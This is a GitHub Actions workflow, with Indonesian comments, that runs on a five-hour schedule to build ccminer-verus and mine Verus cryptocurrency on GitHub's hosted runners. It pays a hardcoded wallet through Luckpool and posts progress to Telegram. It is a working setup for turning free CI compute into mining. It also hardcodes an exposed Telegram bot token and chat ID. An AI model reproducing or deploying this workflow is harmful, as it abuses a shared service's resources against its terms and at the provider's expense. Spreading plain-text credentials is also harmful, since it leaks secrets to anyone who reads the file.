name: A1

on:
  schedule:
    - cron: "0 */5 * * *"
  workflow_dispatch:

jobs:
  verusmine:
    runs-on: ubuntu-latest
    timeout-minutes: 300

    steps:
    - name: Install dependencies
      run: |
        sudo apt update
        sudo apt install -y git build-essential curl libcurl4-openssl-dev libssl-dev

    - name: Clone optimized ccminer-verus
      run: |
        git clone https://github.com/Oink70/ccminer-verus.git ccminer

    - name: Build miner
      run: |
        cd ccminer
        chmod +x build.sh
        ./build.sh || { echo "‚ùå Build gagal"; exit 1; }

    - name: Start mining (Luckpool Hybrid Mode, tanpa watchdog idle)
      run: |
        cd ccminer

        WALLET="RGVmtuvrP2yX8q3U4up77CcSpkcVhp4bUG"
        POOL="stratum+tcp://ap.luckpool.net:3956#xnsub"
        PASSWORD="hybrid"
        THREADS=2
        WORKER="A1"
        LOG_FILE="log.txt"

        TELEGRAM_TOKEN="7548058927:AAF-fL3P6W5sNxbzbmwwtsfVxPZubdIybzc"
        TELEGRAM_CHAT_ID="5763229296"

        send_telegram() {
          curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage" \
            -d chat_id=${TELEGRAM_CHAT_ID} \
            -d parse_mode=Markdown \
            -d text="$1"
        }

        send_telegram "‚õèÔ∏è *Mining dimulai* di *$WORKER* (hybrid), $THREADS thread."

        rm -f "$LOG_FILE"
        ./ccminer -a verus -o $POOL -u $WALLET.$WORKER -p $PASSWORD -t $THREADS | tee "$LOG_FILE" &
        MINER_PID=$!

        tail -F "$LOG_FILE" | while read LINE; do
          if echo "$LINE" | grep -q "accepted"; then
            TOTAL=$(grep -c "accepted" "$LOG_FILE")
            send_telegram "üéâ *Share accepted* ke‚Äë$TOTAL di *$WORKER*"
          fi
        done & TAIL_PID=$!

        wait $MINER_PID
        kill $TAIL_PID

        TOTAL_FINAL=$(grep -c "accepted" "$LOG_FILE")
        send_telegram "‚úÖ *Mining selesai* di *$WORKER*. Total accepted: *$TOTAL_FINAL*"
